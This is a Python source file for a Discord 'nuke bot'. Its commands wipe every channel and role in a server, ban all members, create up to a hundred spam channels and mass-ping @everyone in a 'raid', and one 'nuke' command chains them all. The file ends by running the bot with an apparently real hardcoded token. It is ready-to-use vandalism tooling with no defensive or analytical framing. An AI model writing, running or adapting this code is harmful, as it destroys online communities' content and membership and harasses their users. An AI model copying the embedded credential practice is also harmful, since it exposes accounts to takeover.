"""nuke bot"""
import discord
from discord.ext import commands

INTENTS = discord.Intents.all()

CLIENT = commands.Bot(command_prefix='$', intents=INTENTS)

CLIENT.remove_command("help")


@CLIENT.event
async def on_ready():
    """triggers when bot is running"""
    activity = discord.Game(name="s!help", type=3)
    await CLIENT.change_presence(status=discord.Status.online, activity=activity)
    print("Nuke primed")

@CLIENT.event
async def on_server_join(server):
    """triggers on server join"""
    print("Joining {0}".format(server.name))


@CLIENT.command(pass_context=True)
async def clear(ctx):
    """clears all roles and channels then makes one new one and sends a msg"""
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print(channel.name + " has been deleted")
        except:
            print("something went wrong (clearchannels")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(role.name + "has been deleted")
        except:
            print("something went wrong (clearroles)")
    channel = await ctx.guild.create_text_channel("Get Nuked")
    await channel.send("NUKED HAHA")
    print("Cleared out")

@CLIENT.command(pass_context=True)
async def massban(ctx):
    """bans every user"""
    for member in list(ctx.message.guild.members):
        try:
            await ctx.guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            print("Couldn't ban " + member.name)

@CLIENT.command(pass_context=True)
async def channel(ctx, x=1):
    """creates x channels"""
    guild = ctx.guild
    for i in range(x):
        await guild.create_text_channel("nuked")
    print("created " + str(x) + " channels")

@CLIENT.command(pass_context=True)
async def raid(ctx):
    for i in range(20):
        for c in ctx.guild.channels:
            for k in range(5):
                await c.send(ctx.guild.default_role)

@CLIENT.command(pass_context=True)
async def nuke(ctx):
    """nukes a server"""
    try:
        await clear(ctx)
        await massban(ctx)
        for i in range(100):
            await channel(ctx)
        await raid(ctx)
    except:
        print("something went wrong (nuke)")

CLIENT.run("Nzg2MzAxNTgzMDc1NTczNzkx.X9Eaag.RuP_5uiwKWpTz1SwSp2WJLkEfy0")
